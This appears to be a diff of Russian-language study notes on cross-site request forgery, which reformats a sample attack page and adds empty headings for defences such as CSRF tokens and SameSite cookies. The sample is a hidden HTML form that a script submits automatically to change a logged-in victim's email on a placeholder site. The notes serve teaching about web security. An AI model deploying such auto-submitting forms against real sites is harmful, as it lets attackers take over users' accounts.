@@ -23,12 +23,12 @@ email=wiener@normal-user.com
 
 ```html
 <html>
-	<body>
-		<form action="https://vulnerable-website.com/email/change" method="POST">
-			<input type="hidden" name="email" value="pwned@evil-user.net" />
-		</form>
-		<script> document.forms[0].submit(); </script>
-	</body>
+    <body>
+        <form action="https://vulnerable-website.com/email/change" method="POST">
+            <input type="hidden" name="email" value="pwned@evil-user.net" />
+        </form>
+        <script> document.forms[0].submit(); </script>
+    </body>
 </html>
 ```
 
@@ -37,5 +37,12 @@ email=wiener@normal-user.com
 - Если пользователь вошел на уязвимый сайт, его браузер автоматически включит в запрос сессионный файл cookie (при условии, что не используются SameSite cookie).
 - Уязвимый веб-сайт обработает запрос обычным образом, расценит его как сделанный пользователем-жертвой и изменит его адрес электронной почты.
 
-  
+# Common defences against CSRF
+## CSRF токены
+
+
+## SameSite cookie
+
+
+## Refer-based валидация
 
